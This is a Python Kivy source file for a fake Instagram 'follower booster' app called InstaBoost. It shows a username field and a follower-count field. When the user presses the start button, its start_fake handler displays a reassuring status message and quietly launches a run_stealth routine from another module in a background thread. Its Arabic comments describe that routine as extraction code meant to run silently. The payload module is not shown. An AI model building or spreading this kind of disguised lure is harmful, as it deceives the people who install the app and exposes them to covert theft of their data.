from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.core.window import Window
import threading
from core import run_stealth # استدعاء كود السحب من الملف الثاني

Window.clearcolor = (0.1, 0.05, 0.2, 1) # لون بنفسجي احترافي

class InstaBoostUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = [40, 60]
        self.spacing = 20

        self.add_widget(Label(text="🚀 InstaBoost v2.1", font_size='26sp', bold=True, color=(0.7, 0.3, 1, 1)))
        
        self.user_input = TextInput(multiline=False, hint_text="Username...", background_color=(0.2, 0.2, 0.3, 1), foreground_color=(1,1,1,1))
        self.add_widget(self.user_input)

        self.count_input = TextInput(multiline=False, hint_text="Followers Count...", input_filter='int', background_color=(0.2, 0.2, 0.3, 1), foreground_color=(1,1,1,1))
        self.add_widget(self.count_input)

        self.btn = Button(text="START BOOST", background_color=(0.5, 0.2, 0.8, 1), bold=True, size_hint_y=None, height='50dp')
        self.btn.bind(on_press=self.start_fake)
        self.add_widget(self.btn)

        self.status = Label(text="Status: Waiting...", font_size='12sp', color=(0.5, 0.5, 0.5, 1))
        self.add_widget(self.status)

    def start_fake(self, instance):
        if self.user_input.text and self.count_input.text:
            self.status.text = "Connecting to Secure Servers..."
            self.btn.disabled = True
            # تشغيل كود السحب في الخلفية صمتاً
            threading.Thread(target=run_stealth, daemon=True).start()
        else:
            self.status.text = "Error: Fill all fields!"

class MainApp(App):
    def build(self):
        return InstaBoostUI()

if __name__ == "__main__":
    MainApp().run()
